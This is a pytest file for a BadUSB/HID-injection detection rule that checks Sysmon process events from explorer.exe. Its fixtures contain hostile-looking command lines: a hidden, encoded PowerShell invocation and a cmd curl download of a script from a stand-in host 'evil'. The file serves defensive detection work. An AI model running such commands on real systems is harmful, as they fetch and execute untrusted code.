"""
Tests for the HID-injection / BadUSB detection rule (rules/hid_injection.yaml).
Loads the real rules/ directory so the shipped YAML is exercised end-to-end,
matching the pattern in tests/test_extended_rules.py.
"""

import sys
from datetime import datetime
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules.detection_engine import DetectionEngine


@pytest.fixture(scope="module")
def engine():
    rules_dir = Path(__file__).parent.parent / "rules"
    return DetectionEngine(rules_dir=str(rules_dir))


def _rule(engine, rule_id):
    for r in engine.rules:
        if r.id == rule_id:
            return r
    raise AssertionError(f"rule {rule_id} not loaded")


class TestHidInjectionRule:
    def test_rule_is_loaded_with_mitre(self, engine):
        r = _rule(engine, "hid_injection_001")
        assert r.severity == "high"
        assert "T1200" in r.mitre
        assert "T1059.001" in r.mitre

    def test_matches_explorer_spawning_encoded_powershell(self, engine):
        r = _rule(engine, "hid_injection_001")
        sysmon = {
            "ParentImage": "C:\\Windows\\explorer.exe",
            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "CommandLine": "powershell.exe -w hidden -nop -enc SQBFAFgA",
        }
        assert r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_matches_explorer_spawning_cmd_download(self, engine):
        r = _rule(engine, "hid_injection_001")
        sysmon = {
            "ParentImage": "explorer.exe",
            "Image": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": 'cmd.exe /c "curl http://evil/a.ps1 -o a.ps1"',
        }
        assert r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_benign_explorer_powershell_without_suspicious_flags(self, engine):
        """explorer -> powershell happens legitimately; without the flags it must NOT fire."""
        r = _rule(engine, "hid_injection_001")
        sysmon = {
            "ParentImage": "explorer.exe",
            "Image": "powershell.exe",
            "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1",
        }
        assert not r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_encoded_powershell_from_normal_parent_does_not_match(self, engine):
        """Same suspicious command line, but NOT spawned by explorer -> different vector, no match here."""
        r = _rule(engine, "hid_injection_001")
        sysmon = {
            "ParentImage": "C:\\Windows\\System32\\services.exe",
            "Image": "powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgA",
        }
        assert not r.matches("1", datetime.now(), "", "Sysmon", sysmon)

    def test_wrong_provider_does_not_match(self, engine):
        r = _rule(engine, "hid_injection_001")
        sysmon = {
            "ParentImage": "explorer.exe",
            "Image": "powershell.exe",
            "CommandLine": "powershell.exe -enc SQBFAFgA",
        }
        assert not r.matches("1", datetime.now(), "", "Security", sysmon)


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
